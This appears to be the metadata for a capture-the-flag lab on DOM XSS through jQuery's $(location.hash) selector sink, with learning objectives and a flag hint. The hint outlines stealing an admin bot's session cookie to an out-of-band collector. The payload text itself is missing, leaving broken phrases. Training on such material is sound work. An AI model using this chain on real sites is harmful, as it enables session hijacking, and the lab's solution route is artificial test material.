title: DOM XSS via jQuery $(location.hash) Selector-to-Constructor
learning_objectives: Recognise that jQuery's $() is overloaded: an HTML-looking string is CONSTRUCTED into elements, not selected — making $() a DOM-XSS sink for untrusted input
Trace a DOM sink from source (location.hash) to sink ($()) where a 'scroll to section' helper passes the fragment straight to jQuery
Use so the payload fires on element construction (a detached node still loads its src) without the bot clicking anything
Understand why jQuery < 3.5 (here 3.4.1) widens the selector-vs-HTML boundary and why upgrading is only half the fix
Exfiltrate a non-HttpOnly session cookie to an OOB collector across an egress-dropped network and recognise the real fix: never pass untrusted strings to $()
flag_hint: Submit /# (URL-encoded) to POST /report; the page's $(location.hash.slice(1)) constructs the and onerror fires in the admin bot's browser, exfiltrating its session cookie. Read it via GET /oob/received, then POST /solve {"c":"<32 hex>"}.
inspired_by: The jQuery $(location.hash) selector-to-HTML DOM-XSS pattern (PortSwigger DOM XSS in jQuery selector sink), abstracted for local Docker with a Playwright victim bot and an OOB collector. Ships the catalog-pinned jQuery 3.4.1 (< 3.5) because that version's loose selector-vs-HTML boundary is the taught flaw.
